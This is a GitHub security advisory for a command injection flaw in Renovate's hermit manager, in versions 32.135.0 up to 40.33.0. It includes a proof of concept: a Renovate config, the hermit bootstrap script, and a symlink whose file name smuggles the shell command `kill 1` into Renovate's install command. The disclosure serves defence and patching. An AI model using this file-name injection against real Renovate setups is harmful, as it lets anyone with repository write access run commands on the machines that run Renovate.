# [M] Renovate vulnerable to arbitrary command injection via hermit manager and maliciously named dependencies

## Summary
Severity: Medium
Advisory: GHSA-36j9-mx87-2cff
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-36j9-mx87-2cff
Type: github-advisory

## Affected
- npm: `renovate` — affected >=32.135.0 <40.33.0

## Details
### Summary
The user-provided string `depName` in the `hermit` manager is appended to the `./hermit install` and `./hermit uninstall` commands without proper sanitization.

### Details
Adversaries can provide a maliciously named hermit dependency in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.
All values added to the `packagesToInstall` and `packagesToUninstall` variables in [lib/modules/manager/hermit/artifacts.ts](https://github.com/renovatebot/renovate/blob/41e8b99f86a6e2a56f80f7aa1a08a59d76f2358c/lib/modules/manager/hermit/artifacts.ts) are not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization for installing packages has been present in the product since the introduction of the hermit manager in version 32.135.0 (https://github.com/renovatebot/renovate/commit/b696abb3c2741508fbb4029f39153140a3722e1e), released on July 30 of 2022.
In version 37.199.1 (https://github.com/renovatebot/renovate/commit/eaec10d7c8afadbdd783ac47bd2adbfab444d6df) some use of the `quote` function from the `shlex` package was added, but not in a way that usefully prevented this arbitrary code injection vulnerability.
When support for replacements was introduced with version 37.214.4 (https://github.com/renovatebot/renovate/commit/41e8b99f86a6e2a56f80f7aa1a08a59d76f2358c), the same faulty approach was replicated for uninstalling packages.

### PoC
1. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  customDatasources: {
    always: {
      defaultRegistryUrlTemplate: "https://docs.renovatebot.com/search/search_index.json",
      transformTemplates: ['{"releases":[{"version":"99999.0.0"}]}'],
    },
  },
  packageRules: [
    {
      // Target of the day
      matchManagers: ["hermit"],
      // Trick the manager in believing there's a new version
      overrideDatasource: "custom.always",
    },
  ],
}

```


`bin/hermit`:

```bash
#!/bin/bash
#
# THIS FILE IS GENERATED; DO NOT MODIFY

set -eo pipefail

export HERMIT_USER_HOME=~

if [ -z "${HERMIT_STATE_DIR}" ]; then
  case "$(uname -s)" in
  Darwin)
    export HERMIT_STATE_DIR="${HERMIT_USER_HOME}/Library/Caches/hermit"
    ;;
  Linux)
    export HERMIT_STATE_DIR="${XDG_CACHE_HOME:-${HERMIT_USER_HOME}/.cache}/hermit"
    ;;
  esac
fi

export HERMIT_DIST_URL="${HERMIT_DIST_URL:-https://github.com/cashapp/hermit/releases/download/stable}"
HERMIT_CHANNEL="$(basename "${HERMIT_DIST_URL}")"
export HERMIT_CHANNEL
export HERMIT_EXE=${HERMIT_EXE:-${HERMIT_STATE_DIR}/pkg/hermit@${HERMIT_CHANNEL}/hermit}

if [ ! -x "${HERMIT_EXE}" ]; then
  echo "Bootstrapping ${HERMIT_EXE} from ${HERMIT_DIST_URL}" 1>&2
  INSTALL_SCRIPT="$(mktemp)"
  # This value must match that of the install script
  INSTALL_SCRIPT_SHA256="09ed936378857886fd4a7a4878c0f0c7e3d839883f39ca8b4f2f242e3126e1c6"
  if [ "${INSTALL_SCRIPT_SHA256}" = "BYPASS" ]; then
    curl -fsSL "${HERMIT_DIST_URL}/install.sh" -o "${INSTALL_SCRIPT}"
  else
    # Install script is versioned by its sha256sum value
    curl -fsSL "${HERMIT_DIST_URL}/install-${INSTALL_SCRIPT_SHA256}.sh" -o "${INSTALL_SCRIPT}"
    # Verify install script's sha256sum
    openssl dgst -sha256 "${INSTALL_SCRIPT}" | \
      awk -v EXPECTED="$INSTALL_SCRIPT_SHA256" \
      '$2!=EXPECTED {print "Install script sha256 " $2 " does not match " EXPECTED; exit 1}'
  fi
  /bin/bash "${INSTALL_SCRIPT}" 1>&2
fi

exec "${HERMIT_EXE}" --level=fatal exec "$0" -- "$@"

```


`bin/.|| kill 1 ||@0.0.1.pkg` (symlink):

A symlink to `hermit`

2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

> [!NOTE]
> This specific proof of concept was made a lot simpler with the introduction of the `overrideDatasource` configuration since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024, because it means that there is no more need for a proper response from an actual hermit-packages repository during resolution.

### Impact
TThis is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

## References
- https://github.com/renovatebot/renovate/security/advisories/GHSA-36j9-mx87-2cff
- https://github.com/renovatebot/renovate
